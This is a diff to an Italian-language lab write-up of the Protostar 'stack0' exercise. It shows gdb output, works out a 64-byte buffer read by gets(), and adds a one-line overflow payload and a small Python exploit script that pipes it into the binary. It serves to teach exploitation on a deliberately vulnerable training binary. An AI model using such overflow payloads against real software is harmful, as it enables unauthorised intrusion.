@@ -1,4 +1,4 @@
-````
+```` bash
 proto@b92cf65f7998:/opt/protostar/bin$ gdb -q                                                      
 (gdb) file stack0 
 Reading symbols from stack0...done.
@@ -30,6 +30,25 @@ Nota bene che viene usata nel codice la gets()
 La gets viene messa a puntare dove inizia la variabile buffer, che risiede su 0x5c, quello che viene passato a gets è 0x1c, quindi per trovare la lunghezza del buffer fare 0x5c - 0x1c = 64
 Quindi l'idea di buff overflow è A * 64 + 1
 payload di attacco: 
-````
+```` bash
 python3 -c 'print("A"*64 + str(1))' | ./stack0
+````
+
+**exploit.py**
+```` python
+import subprocess
+
+junk = '\x41'    # Junk to overflow the buffer (gets())
+fault = '1'      # Byte to create the segmentation fault
+
+# Create the payload to break the binary
+payload = junk * 64 + fault
+
+# Create the process to run the binary
+process = subprocess.Popen(["./stack0"], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+# Execute the binary 
+stdout, stderr = process.communicate(input=payload.encode()) 
+
+print(stdout)
+print(stderr)
 ````
